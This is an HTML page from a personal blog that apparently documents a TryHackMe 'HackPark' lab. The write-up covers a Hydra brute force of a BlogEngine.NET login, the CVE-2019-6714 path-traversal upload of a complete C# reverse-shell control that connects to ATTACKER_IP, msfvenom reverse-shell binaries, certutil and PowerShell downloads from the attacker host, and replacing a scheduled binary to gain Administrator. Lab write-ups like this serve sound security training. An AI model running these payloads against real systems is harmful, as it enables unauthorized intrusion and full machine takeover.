@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HackPark | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Hydra brute force on BlogEngine.NET login, CVE-2019-6714 path traversal RCE via crafted PostView.ascx, SystemScheduler binary replacement for Administrator, both flags pulled, winPEAS enumeration.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/hackpark.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/hackpark.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="HackPark">
+<meta property="og:description" content="TryHackMe CTF: Hydra brute force on BlogEngine.NET login, CVE-2019-6714 path traversal RCE via crafted PostView.ascx, SystemScheduler binary replacement for Administrator, both flags pulled, winPEAS enumeration.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HackPark">
+<meta name="twitter:description" content="TryHackMe CTF: Hydra brute force on BlogEngine.NET login, CVE-2019-6714 path traversal RCE via crafted PostView.ascx, SystemScheduler binary replacement for Administrator, both flags pulled, winPEAS enumeration.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">HackPark</h1>
+    <div class="post-description">TryHackMe CTF. Brute force a website login with Hydra, exploit a public CVE, and escalate to Administrator on a Windows machine. Featuring Pennywise the clown, who I am asking nicely to stay in his lane.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Reconnaissance</h2>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
+
+<p>While that runs, a quick browser check.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-05 at 9.12.58 PM.png" alt="HackPark homepage showing Pennywise the clown" style="max-width:100%;margin:2rem 0;">
+
+<p>I&rsquo;m so sorry. I need PoC. Well, PoV (Proof of Visit).</p>
+
+<p>View source so this isn&rsquo;t in my face. Image search in a fresh tab confirms what we&rsquo;re dealing with.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-05 at 9.14.29 PM.png" alt="Image search confirming clown identity as Pennywise" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Clown on the homepage:</strong> Pennywise.</p>
+
+<p>Nmap results:</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-05 at 9.17.15 PM.png" alt="Nmap scan results showing open ports and vulnerability output" style="max-width:100%;margin:2rem 0;">
+
+<p>Now this is my idea of a good time. Everything from <code>robots.txt</code> to calendar PHP files, port 3389 with a vulnerable Diffie-Hellman algorithm, and so much more.</p>
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>80 HTTP</li>
+<li>3389 RDP</li>
+</ul>
+
+<p>In the source code, two things stand out:</p>
+
+<pre><code class="language-html">&lt;a href="http://TARGET_IP/author/Admin"&gt;Administrator&lt;/a&gt;
+&lt;a href="/category/BlogEngineNET"&gt;BlogEngine.NET&lt;/a&gt;</code></pre>
+
+<p>So we know the username (<code>admin</code>) and the CMS (BlogEngine.NET). The login portal is:</p>
+
+<pre><code>http://TARGET_IP/Account/login.aspx?ReturnURL=/admin/</code></pre>
+
+<p>I feel like this challenge is preying on all of our neurodivergent superpowers.</p>
+
+<hr>
+
+<h2>Login brute force with Hydra</h2>
+
+<p>Fire up Burp and intercept a login request:</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 6.23.38 AM.png" alt="Burp Suite intercepting the BlogEngine.NET login POST request" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Request type:</strong> POST.</p>
+
+<p>For Hydra we need three things from the response: the path, the POST body, and the failure string.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 6.45.26 AM.png" alt="Burp response showing POST body fields and failure string for Hydra" style="max-width:100%;margin:2rem 0;">
+
+<p>Final Hydra payload:</p>
+
+<pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f TARGET_IP http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=...&amp;__EVENTVALIDATION=...&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed"</code></pre>
+
+<p>(VIEWSTATE and EVENTVALIDATION values get pulled from the intercepted request.)</p>
+
+<p>Bust in:</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 10.27.00 AM.png" alt="Hydra output showing successful credential crack: admin:1qaz2wsx" style="max-width:100%;margin:2rem 0;">
+
+<p>Good work, Hydra. Thank you.</p>
+
+<p><strong>Cracked password:</strong> <code>1qaz2wsx</code></p>
+
+<p>If your syntax has the success marker <code>S=admin/app/editor/editpost.cshtml</code> in it, remove it. Too specific, and the brute force will hang.</p>
+
+<hr>
+
+<h2>Identifying the CVE</h2>
+
+<p>Log into BlogEngine with the cracked creds. Head to the About tab for the version.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 11.34.32 AM.png" alt="BlogEngine.NET About page showing version 3.3.6.0" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Version:</strong> 3.3.6.0</p>
+
+<p>Over to ExploitDB:</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 11.37.23 AM.png" alt="ExploitDB showing CVE-2019-6714 path traversal exploit for BlogEngine.NET 3.3.6.0" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>CVE:</strong> 2019-6714. Path traversal vulnerability that, if exploited correctly, allows remote code execution via the editable post functionality.</p>
+
+<hr>
+
+<h2>Remote code execution</h2>
+
+<p>Craft the payload offline. It must be saved verbatim as <code>PostView.ascx</code>.</p>
+
+<pre><code class="language-bash">nano PostView.ascx</code></pre>
+
+<pre><code class="language-csharp">&lt;%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %&gt;
+&lt;%@ Import Namespace="BlogEngine.Core" %&gt;
+
+&lt;script runat="server"&gt;
+    static System.IO.StreamWriter streamWriter;
+
+    protected override void OnLoad(EventArgs e) {
+        base.OnLoad(e);
+        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("ATTACKER_IP", 4445)) {
+            using(System.IO.Stream stream = client.GetStream()) {
+                using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
+                    streamWriter = new System.IO.StreamWriter(stream);
+                    StringBuilder strInput = new StringBuilder();
+                    System.Diagnostics.Process p = new System.Diagnostics.Process();
+                    p.StartInfo.FileName = "cmd.exe";
+                    p.StartInfo.CreateNoWindow = true;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardInput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
+                    p.Start();
+                    p.BeginOutputReadLine();
+                    while(true) {
+                        strInput.Append(rdr.ReadLine());
+                        p.StandardInput.WriteLine(strInput);
+                        strInput.Remove(0, strInput.Length);
+                    }
+                }
+            }
+        }
+    }
+
+    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
+        StringBuilder strOutput = new StringBuilder();
+        if (!String.IsNullOrEmpty(outLine.Data)) {
+            try {
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            } catch (Exception err) { }
+        }
+    }
+&lt;/script&gt;
+&lt;asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"&gt;&lt;/asp:PlaceHolder&gt;</code></pre>
+
+<p>Modify line 10 to your IP and port, save, exit.</p>
+
+<p>Start the listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4445</code></pre>
+
+<p>In BlogEngine, head to Content &gt; Posts. Open a post, click the File Manager (small folder icon), and upload <code>PostView.ascx</code>.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 1.49.50 PM.png" alt="BlogEngine File Manager showing PostView.ascx uploaded and ready" style="max-width:100%;margin:2rem 0;">
+
+<p>If I remove the clown, will my exploit fail? I don&rsquo;t know how much more I can handle.</p>
+
+<p>BlogEngine places the upload at <code>/App_Data/files</code>. Trigger the exploit by visiting:</p>
+
+<pre><code>http://TARGET_IP/?theme=../../App_Data/files</code></pre>
+
+<p>Eyes on the listener.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 1.56.47 PM.png" alt="Netcat listener catching the reverse shell from BlogEngine RCE" style="max-width:100%;margin:2rem 0;">
+
+<p>Bam. RCE, baby.</p>
+
+<p><strong>Webserver runs as:</strong> <code>iis apppool\blog</code></p>
+
+<hr>
+
+<h2>Privesc via SystemScheduler</h2>
+
+<p>This shell feels unstable, the way it responds to command input speaks volumes. Enumerate first.</p>
+
+<pre><code class="language-powershell">dir "C:\Program Files (x86)"</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 2.18.18 PM.png" alt="Directory listing of Program Files (x86) showing SystemScheduler" style="max-width:100%;margin:2rem 0;">
+
+<p><code>SystemScheduler</code> sounds like exactly what we want.</p>
+
+<pre><code class="language-powershell">dir "C:\Program Files (x86)\SystemScheduler"</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 2.22.19 PM.png" alt="SystemScheduler directory listing showing WindowsScheduler service and Message.exe" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Service name:</strong> <code>WindowsScheduler</code></p>
+
+<p>Look at the scheduled events:</p>
+
+<pre><code class="language-powershell">dir "C:\Program Files (x86)\SystemScheduler\Events"
+type "C:\Program Files (x86)\SystemScheduler\Events\20198415519.INI"</code></pre>
+
+<p>The INI shows the scheduled task metadata, including Administrator ownership and context. The task runs <code>Message.exe</code> from the SystemScheduler directory, as Administrator. That binary is the privesc.</p>
+
+<p><strong>Target binary:</strong> <code>Message.exe</code></p>
+
+<p>On the attacker box, generate a replacement:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe -o Message.exe</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 2.51.40 PM.png" alt="msfvenom generating the replacement Message.exe payload" style="max-width:100%;margin:2rem 0;">
+
+<p>New listener on 4446 (leave the 4445 one running):</p>
+
+<pre><code class="language-bash">nc -lvnp 4446</code></pre>
+
+<p>Python server in the directory with <code>Message.exe</code>:</p>
+
+<pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+<p>Back in the RCE shell, pull the payload onto the target:</p>
+
+<pre><code class="language-powershell">certutil -urlcache -split -f http://ATTACKER_IP:8000/Message.exe C:\Windows\Temp\Message.exe</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.10.32 PM.png" alt="certutil successfully downloading Message.exe to the target" style="max-width:100%;margin:2rem 0;">
+
+<p>Exquisite. CertUtil pulled it down.</p>
+
+<p>Back up the original, then drop our payload in place:</p>
+
+<pre><code class="language-powershell">copy "C:\Program Files (x86)\SystemScheduler\Message.exe" "C:\Program Files (x86)\SystemScheduler\Message.exe.bak"
+copy /Y C:\Windows\Temp\Message.exe "C:\Program Files (x86)\SystemScheduler\Message.exe"</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.13.06 PM.png" alt="Backup and replacement of Message.exe confirmed in shell" style="max-width:100%;margin:2rem 0;">
+
+<p>Wait for the scheduled task to fire. Eyes on 4446.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.22.15 PM.png" alt="Netcat listener on 4446 catching the Administrator reverse shell" style="max-width:100%;margin:2rem 0;">
+
+<p>Caught it. <code>whoami</code> wasn&rsquo;t displaying cleanly, so I went absolute:</p>
+
+<pre><code class="language-cmd">C:\Windows\System32\whoami.exe</code></pre>
+
+<p>User flag:</p>
+
+<pre><code class="language-powershell">type C:\Users\jeff\Desktop\user.txt</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.25.09 PM.png" alt="user.txt flag: 759bd8af507517bcfaede78a21a73e39" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>759bd8af507517bcfaede78a21a73e39</code></p>
+
+<p>Root flag:</p>
+
+<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.26.27 PM.png" alt="root.txt flag: 7e13d97f05f7ceb9881a3eb3d78d3e72" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>7e13d97f05f7ceb9881a3eb3d78d3e72</code></p>
+
+<hr>
+
+<h2>Enumeration with winPEAS</h2>
+
+<p>A more stable shell is worth having. Generate one:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe -o stable.exe</code></pre>
+
+<p>New listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4447</code></pre>
+
+<p>Drop <code>winPEAS.bat</code> into the Python server directory:</p>
+
+<pre><code class="language-bash">find /usr/share -iname "winPEAS.bat" 2>/dev/null
+cp /usr/share/peass/winpeas/winPEAS.bat ~/</code></pre>
+
+<p>Pull it onto the target:</p>
+
+<pre><code class="language-powershell">powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP:8000/winPEAS.bat -OutFile C:\Windows\Temp\winPEAS.bat"
+C:\Windows\Temp\winPEAS.bat</code></pre>
+
+<p>If there&rsquo;s a pea smiling at you, it started.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.47.08 PM.png" alt="winPEAS.bat starting on the target with characteristic ASCII art banner" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.49.10 PM.png" alt="winPEAS output showing system enumeration results" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Original Install time:</strong> <code>8/3/2019, 10:43:23 AM</code></p>
+
+<p>Cue the confetti.</p>
+
+<img src="/images/hackpark/Screenshot 2026-06-06 at 3.50.01 PM.png" alt="winPEAS output showing additional system information and install time" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP
+# Port 80 (BlogEngine.NET), 3389 RDP. Username "Admin" visible in source.
+
+# 2. Brute force the BlogEngine login with Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f TARGET_IP http-post-form \
+  "/Account/login.aspx?ReturnURL=%2fadmin%2f:VIEWSTATE=...&amp;UserName=^USER^&amp;Password=^PASS^&amp;LoginButton=Log+in:F=Login failed"
+# -&gt; admin:1qaz2wsx
+
+# 3. Identify CVE-2019-6714 in BlogEngine.NET 3.3.6.0 (path traversal -&gt; RCE)
+
+# 4. Upload PostView.ascx (custom reverse shell payload) via File Manager
+nc -lvnp 4445
+# Trigger:
+# http://TARGET_IP/?theme=../../App_Data/files
+# -&gt; shell as iis apppool\blog
+
+# 5. Privesc: SystemScheduler runs Message.exe as Administrator
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe -o Message.exe
+nc -lvnp 4446
+# Drop payload on target via certutil:
+certutil -urlcache -split -f http://ATTACKER_IP:8000/Message.exe C:\Windows\Temp\Message.exe
+# Replace the scheduled binary:
+copy /Y C:\Windows\Temp\Message.exe "C:\Program Files (x86)\SystemScheduler\Message.exe"
+# Wait for task to fire -&gt; Administrator shell
+type C:\Users\jeff\Desktop\user.txt
+type C:\Users\Administrator\Desktop\root.txt
+
+# 6. winPEAS enumeration for full system context
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe -o stable.exe
+nc -lvnp 4447
+powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP:8000/winPEAS.bat -OutFile C:\Windows\Temp\winPEAS.bat"
+C:\Windows\Temp\winPEAS.bat</code></pre>
+
+<p>Recap: Hydra brute force on BlogEngine login, CVE-2019-6714 path traversal RCE via crafted PostView.ascx, SystemScheduler binary replacement for Administrator, both flags pulled, winPEAS enumeration for the full system picture.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
